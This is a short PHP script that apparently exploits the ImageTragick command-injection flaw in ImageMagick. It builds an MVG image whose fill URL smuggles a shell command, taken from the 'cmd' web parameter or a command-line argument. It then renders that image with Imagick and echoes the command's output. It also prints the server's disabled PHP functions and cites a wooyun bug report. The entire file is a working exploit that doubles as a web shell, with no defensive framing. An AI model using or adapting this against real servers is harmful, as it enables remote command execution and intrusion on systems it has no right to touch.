<?php

echo "Disable Functions: " . ini_get('disable_functions') . "\n";



$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];

if ($command == '') {

    $command = 'id';

}



$command = $command . ">" . SAE_TMP_PATH . "/data";



$exploit = <<<EOF

push graphic-context

viewbox 0 0 640 480

fill 'url(https://example.com/image.jpg"|$command")'

pop graphic-context

EOF;



$path1 = SAE_TMP_PATH . "KKKK.mvg";

$path2 = SAE_TMP_PATH . "KKKK.png";



file_put_contents($path1, $exploit);

$thumb = new Imagick();

$thumb->readImage($path1);

$thumb->writeImage($path2);

$thumb->clear();

$thumb->destroy();

unlink("$path1");

unlink("$path2");

echo file_get_contents(SAE_TMP_PATH . "/data");

?>


//http://www.wooyun.org/bugs/wooyun-2016-0205051
